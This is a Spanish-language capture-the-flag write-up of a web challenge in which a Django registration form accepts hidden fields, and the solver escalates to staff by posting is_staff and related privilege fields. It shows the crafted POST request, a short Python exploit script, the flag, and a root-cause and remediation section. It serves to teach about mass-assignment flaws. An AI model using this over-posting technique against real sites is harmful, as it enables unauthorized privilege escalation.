# Write-up — Overqualified

| | |
|---|---|
| **CTF** | FluidAttacks CTF 2026 |
| **Categoría** | web |
| **Dificultad** | Medium |
| **Puntos** | 105 |
| **Flag** | `flag{6ab85d219e827562}` |
| **Vulnerabilidad** | Mass Assignment / over-posting en el registro → Broken Access Control (auto-escalada a Staff) |

---

## 1. Enunciado

> NexaCorp's employee portal lets new hires sign up for internal access. HR swears
> the onboarding form only asks for name, email, and password. **Just those three.
> Promise.**

Instancia desplegada: `https://4d1d213ac2fb20d0.chal.ctf.ae`

El propio título —*Overqualified*— y la insistencia sospechosa de RRHH ("solo esos
tres campos, lo prometo") apuntan al patrón: el formulario **acepta más campos de los
que muestra**. Es un *mass assignment* de manual.

---

## 2. Reconocimiento

La raíz redirige a `/login/` y las cabeceras delatan el stack:

```http
GET /
→ 302 Location: /login/
Server: gunicorn
Vary: Cookie · X-Frame-Options: DENY · Referrer-Policy: same-origin
```

`gunicorn`, las barras finales obligatorias y el `csrfmiddlewaretoken` del formulario
confirman **Django**. Enumerando rutas:

```
200  /login/
200  /register/     ← alta de usuarios
302  /dashboard/    ← requiere sesión
```

El formulario de `/register/` expone exactamente cuatro campos:

```html
<form method="post" action="/register/">
  <input type="hidden" name="csrfmiddlewaretoken" value="...">
  <input name="username">
  <input name="email">
  <input name="password">
  <input name="password_confirm">
</form>
```

Tras registrar un usuario normal, el dashboard muestra el nivel de acceso:

```
Role:   Employee
Status: Active
Admin tools are limited to staff accounts. Reach out to your administrator if you
need elevated access.
```

La flag, por tanto, vive detrás de una cuenta **staff**.

---

## 3. Encontrando la vulnerabilidad

En Django, el modelo de usuario (`AbstractUser`) trae de serie los booleanos
`is_staff` e `is_superuser`. Si la vista de registro construye el usuario volcando el
`request.POST` sin una lista blanca de campos —el clásico *over-posting*, por ejemplo
un `ModelForm` con `fields = "__all__"` o un `User.objects.create(**request.POST)`
maquillado— entonces el cliente puede **fijar campos que el formulario no muestra**.

El badge del dashboard dice literalmente "Employee" / "Staff", que mapea directamente
al flag `is_staff`. La hipótesis es simple: añadir `is_staff=true` al POST de registro.

---

## 4. Explotación

Se repite el alta añadiendo el campo oculto (y, por robustez, un par de alias por si el
modelo usa otro nombre):

```http
POST /register/
Content-Type: application/x-www-form-urlencoded

csrfmiddlewaretoken=<token>&username=pwn&email=pwn@nexacorp.com
&password=Sup3rPass!123&password_confirm=Sup3rPass!123
&is_staff=true&is_superuser=true&is_admin=true&role=admin
```

Respuesta `302 → /dashboard/` (Django hace auto-login). Y ahora el dashboard ha
cambiado:

```
Role:  Staff
Administration → Admin Dashboard        ← enlace nuevo
```

El enlace apunta a `/admin/dashboard/`, que antes era inaccesible. Con la cuenta
elevada:

```http
GET /admin/dashboard/    → 200
```
```
Administration — System status and internal configuration
...
Internal System Key · Service signing key · Confidential
flag{6ab85d219e827562}
```

### Script de solución (`exploit.py`)

```bash
$ python3 exploit.py https://4d1d213ac2fb20d0.chal.ctf.ae
[*] registrado pwn_ab12cd34 (status 200)
[*] /admin/dashboard/ -> 200

>>> flag{6ab85d219e827562}
```

```python
data = {
    "csrfmiddlewaretoken": token,
    "username": user, "email": f"{user}@nexacorp.com",
    "password": pw, "password_confirm": pw,
    "is_staff": "true",          # <-- campo oculto: mass assignment
}
S.post(f"{HOST}/register/", data=data, headers={"Referer": f"{HOST}/register/"})
print(re.search(r"flag\{[^}]+\}", S.get(f"{HOST}/admin/dashboard/").text).group(0))
```

> **Nota operativa:** la instancia devolvió `502` tras varias peticiones rápidas
> (recursos limitados). Conviene no lanzar el registro en ráfaga.

---

## 5. Flag

```
flag{6ab85d219e827562}
```

---

## 6. Causa raíz y remediación

**Causa raíz:** *mass assignment*. La vista de alta asigna atributos del usuario a
partir de datos controlados por el cliente sin restringir **qué** campos son
asignables, de modo que un booleano de autorización (`is_staff`) queda expuesto como
si fuera un campo más del formulario. Es un caso de *Broken Access Control*: el control
de privilegios depende de un dato que el propio atacante suministra.

**Cómo se arregla:**

- **Lista blanca explícita de campos.** En un `ModelForm`, declarar
  `fields = ["username", "email", "password"]` — nunca `"__all__"`. Si se usan
  serializers/DRF, fijar `fields` de forma explícita y marcar `is_staff`/`is_superuser`
  como `read_only`.
- **Separar el input del modelo.** Validar la entrada en un DTO/form dedicado y
  construir el `User` campo a campo (`User(username=…, email=…)`), estableciendo los
  privilegios **solo** desde lógica de servidor, jamás desde el POST.
- **Defensa en profundidad:** los flags de autorización (`is_staff`, `role`) deben
  tener un default seguro y modificarse únicamente por un flujo administrativo
  autenticado y auditado, no en el auto-registro público.

**Lección de CTF:** cuando un formulario "promete" que solo pide N campos, prueba a
enviar los campos de privilegio que el framework de turno trae por defecto. En Django
son `is_staff` e `is_superuser`; en otros stacks, `role`, `isAdmin`, `admin`,
`account_type`. El nombre del badge en la UI ("Employee"/"Staff") suele delatar el
campo exacto del modelo.
